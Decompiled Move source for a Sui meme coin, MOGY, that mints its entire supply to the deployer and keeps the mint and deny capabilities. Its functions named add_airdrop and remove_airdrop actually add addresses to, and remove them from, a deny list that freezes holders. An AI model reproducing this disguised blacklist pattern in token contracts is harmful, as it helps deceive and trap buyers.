module 0x3f88a267f1010a89d155e8bb1ef62567c07bc660bf12e2dac54c5839296b8a7d::MOGY {
    struct MOGY has drop {
        dummy_field: bool,
    }

    public entry fun add_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MOGY>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<MOGY>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: MOGY, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<MOGY>(arg0, 6, b"MOGY", b"Sui Mogy", b"MOGY is set to dominate the waters of Sui! With confidence and skill, MOGY is ready to ride the waves and make a splash. Get ready, Sui MOGY is taking over the ocean!", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://movepump.com/_next/image?url=https%3A%2F%2Fapi.movepump.com%2Fuploads%2FKarya_Seni_Tanpa_Judul_86_ae21fe1470.png&w=640&q=75")), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<MOGY>>(v2);
        0x2::transfer::public_transfer<0x2::coin::Coin<MOGY>>(0x2::coin::mint<MOGY>(&mut v3, 10000000000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<MOGY>>(v3, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<MOGY>>(v1, 0x2::tx_context::sender(arg1));
    }

    public entry fun remove_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MOGY>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<MOGY>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

